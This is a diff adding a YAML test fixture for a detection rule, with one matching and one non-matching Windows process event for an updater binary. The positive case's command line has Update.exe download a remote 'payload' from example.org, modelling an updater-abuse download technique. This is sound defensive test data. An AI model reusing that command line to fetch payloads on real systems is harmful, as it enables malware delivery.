@@ -1,0 +1,24 @@
+docs:
+- id: pos1
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: update.exe
+      executable: 'C:\Windows\System32\update.exe'
+      command_line: 'Update.exe --download https://example.org/payload'
+- id: neg1
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: update.exe
+      executable: 'C:\Windows\System32\update.exe'
+      command_line: 'Update.exe --processStart Slack.exe'
